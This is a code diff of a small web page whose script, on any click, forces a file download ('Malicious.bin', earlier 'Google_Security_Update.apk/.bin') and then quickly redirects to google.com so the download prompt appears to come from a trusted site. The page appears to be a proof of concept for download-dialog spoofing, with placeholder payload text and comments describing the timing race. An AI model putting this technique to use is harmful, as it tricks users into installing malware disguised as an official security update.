@@ -7,41 +7,20 @@
 <h1>Click anywhere</h1>
   
 <script>
-document.addEventListener('click', async () => {
+document.addEventListener('click', () => {
+    // Trigger download dialog Android
+    const blob = new Blob(['malicious content'], {type: 'application/octet-stream'});
+    const url = URL.createObjectURL(blob);
     
-    const isMobile = /Android|iPhone/i.test(navigator.userAgent);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = 'Malicious.bin';
+    a.click();
     
-    if (!isMobile && 'showSaveFilePicker' in window) {
-        // === WINDOWS PATH ===
-        setTimeout(async () => {
-            try {
-                const handle = await window.showSaveFilePicker({
-                    suggestedName: 'Google_Security_Update.bin',
-                    types: [{ description: 'Binary', accept: {'application/octet-stream': ['.bin']} }]
-                });
-                const w = await handle.createWritable();
-                await w.write('PAYLOAD');
-                await w.close();
-            } catch(e) {}
-        }, 800);
-        
-    } else {
-        // === ANDROID PATH ===
-        setTimeout(() => {
-            const blob = new Blob(['PAYLOAD'], {type: 'application/octet-stream'});
-            const a = Object.assign(document.createElement('a'), {
-                href: URL.createObjectURL(blob),
-                download: 'Google_Security_Update.apk'
-            });
-            document.body.appendChild(a);
-            a.click();
-        }, 800);
-    }
-    
-    // === SPOOFING: Navigate ke trusted site ===
+    // Race: navigate after dialog appears
     setTimeout(() => {
         window.location.href = 'https://google.com';
-    }, 1000);  // Sedikit delay dari dialog agar overlap terjadi
+    }, 500);  // Android perlu lebih cepat karena download langsung ke notif bar
 });
 </script>
 </body>
